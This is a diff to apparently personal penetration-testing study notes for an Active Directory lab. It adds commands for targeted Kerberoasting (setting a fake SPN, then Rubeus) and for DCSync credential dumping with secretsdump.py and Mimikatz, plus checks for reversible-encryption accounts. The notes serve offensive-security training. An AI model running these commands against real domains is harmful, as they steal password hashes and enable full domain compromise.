@@ -90,3 +90,58 @@ Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -
 ```powershell
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
+
+### Targeted Kerberoasting
+
+We can create a **Fake SPN**
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+Now we can kerberoast the user with `Rubeus`
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+Now we can obtain the hash of the user and try to crack it offline.
+
+---
+
+# DCSync
+
+## What is DCSync and how does it work?
+
+It's a technique used for stealing the AD password database by using the built-in **Directory Replication Service Remote Protocol**. 
+
+It's done by using the `DS-Replication-Get-Changes-All` extended right. To perform the attack, we must have a control over an account that has the (Replicating Directory Changes and Replicating Directory Changes All) permissions.
+#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
+
+```sh
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+```
+
+- `-just-dc-ntlm` can be used if we only wants NTLM
+- `-just-dc-user <USERNAME>` to only extract data for a specific user
+- `-pwd-last-set` to see when each account's password was last changed
+- `history` if we want to dump password history
+- `-user-status` to see if a user is disabled
+#### Viewing an Account with Reversible Encryption Password Storage Set
+
+![[Reversible Encryption.png]]
+#### Enumerating Further using Get-ADUser
+
+```powershell
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
+#### Checking for Reversible Encryption Option using Get-DomainUser
+
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+#### Performing DCSync with Mimikatz
+
+```powershell
+mimikatz.exe "privileged::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
+```
